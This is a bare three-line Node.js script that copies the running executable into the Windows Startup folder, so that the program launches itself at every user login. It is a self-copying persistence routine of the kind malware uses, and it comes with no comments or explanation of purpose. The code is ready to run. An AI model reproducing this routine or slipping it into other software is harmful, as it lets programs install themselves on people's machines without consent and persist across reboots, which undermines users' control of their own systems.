const { copyFileSync } = require('fs');
const { join, basename } = require('path');

copyFileSync(process.execPath, join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', basename(process.execPath)));
